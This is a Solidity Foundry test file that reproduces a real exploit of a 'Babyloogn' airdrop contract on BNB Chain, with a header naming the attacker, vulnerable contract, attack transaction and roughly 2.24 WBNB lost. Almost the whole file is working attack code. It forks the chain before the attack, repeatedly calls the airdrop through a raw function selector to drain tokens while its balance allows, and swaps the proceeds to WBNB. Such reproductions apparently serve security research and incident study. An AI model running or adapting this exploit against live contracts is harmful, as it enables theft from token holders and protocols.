// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~2.24 $WBNB
// Attacker : https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502
// Attack Contract : https://bscscan.com/address/0x3559ee265fc9c5c9a333b07e0199480b4a84f369
// Vulnerable Contract : https://bscscan.com/address/0x971d08bba900230298add23e61e04b04226b5073
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/bsc/0xd081d6bb96326be5305a6c00dd51d1799971794941576554341738abc1ceb202


import "forge-std/Test.sol";
import "./../interface.sol";

interface IBabyloognAirdrop {}

interface IBabyloognNFT {
    function setApprovalForAll(address operator, bool approved) external;
}

interface IBabyloogn {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ContractTest is Test {
    event TokenBalance(string key, uint256 val);

    IBabyloogn Babyloogn = IBabyloogn(0x7fe5fAF242015Cf769Ae7feA565B96351Dd957A2);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IBabyloognAirdrop Airdrop = IBabyloognAirdrop(0x971d08bbA900230298ADD23e61E04B04226b5073);
    IBabyloognNFT BabyloognNTF = IBabyloognNFT(0x5eb47C41FC9BEcf123C9E484C51de37830842AdD);


    function setUp() public {
        vm.createSelectFork("bsc", 36_159_516 - 1);
        vm.label(address(Babyloogn), "Babyloogn");
        vm.label(address(Airdrop), "Airdrop");
        vm.label(address(BabyloognNTF), "BabyloognNTF");
    }

    function testExploit() public {
        emit log_named_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)));
        Babyloogn.approve(address(Router), type(uint256).max);
        BabyloognNTF.setApprovalForAll(address(Airdrop), true);

        while (Babyloogn.balanceOf(address(Airdrop)) >= 285 * 1e18) {
            (bool success,) = address(Airdrop).call(abi.encodeWithSelector(bytes4(0xfbe81135), 1, 0));
        }

        TOKENTOWBNB();
        emit log_named_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)));
    }

    function TOKENTOWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(Babyloogn);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Babyloogn.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    fallback() external payable {}
    receive() external payable {}
}
